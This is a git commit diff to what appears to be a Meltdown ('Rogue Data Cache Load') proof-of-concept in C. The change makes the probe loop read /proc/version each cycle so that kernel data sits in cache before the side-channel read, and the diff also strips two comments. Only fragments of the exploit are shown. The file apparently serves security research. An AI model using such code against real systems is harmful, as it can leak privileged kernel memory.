61228cfd5af965959427effa688e54e4120826bf
KiRinXC <guowenquan24@mails.ucas.ac.cn>
2025-08-17 14:31:30 +0800

    [Test] v3

--- Rogue Data Cache Load/main-v3.c
+++ Rogue Data Cache Load/main-v3.c
@@ -12,9 +12,9 @@
 #include <x86intrin.h>
 
 #define TARGET_OFFSET	12
-#define TARGET_SIZE	(1 << TARGET_OFFSET)   //4096
+#define TARGET_SIZE	(1 << TARGET_OFFSET)
 #define BITS_READ	8
-#define VARIANTS_READ	(1 << BITS_READ)   //256
+#define VARIANTS_READ	(1 << BITS_READ)
 
 int cache_hit_threshold = 400;
 
@@ -95,7 +95,7 @@ int set_signal(void)
 }
 
 #define CYCLES 1000
-int ReadOneByte(unsigned long addr)
+int ReadOneByte(int fd, unsigned long addr)
 {
 	int i, ret = 0, max = -1, maxi = -1;
 	static char buf[256];
@@ -103,6 +103,11 @@ int ReadOneByte(unsigned long addr)
 	memset(hist, 0, sizeof(hist));
 
 	for (i = 0; i < CYCLES; i++) {
+		ret = pread(fd, buf, sizeof(buf), 0);
+		if (ret < 0) {
+			perror("pread");
+			break;
+		}
 
 		clflush_target();
 
@@ -139,7 +144,7 @@ static void pin_cpu0()
 
 int main(int argc, char *argv[])
 {
-	int ret, i, score, is_vulnerable;
+	int ret, fd, i, score, is_vulnerable;
 	unsigned long addr, size;
 
     if (argc == 3 || argc == 4)
@@ -165,6 +170,11 @@ int main(int argc, char *argv[])
 	ret = set_signal();
 	pin_cpu0();
 
+	fd = open("/proc/version", O_RDONLY);
+	if (fd < 0) {
+		perror("open");
+		return -1;
+	}
 
     for (i = 0; i < size; i++)
     {
@@ -178,5 +188,5 @@ int main(int argc, char *argv[])
         addr++;
     }
 
-
+	close(fd);
 }
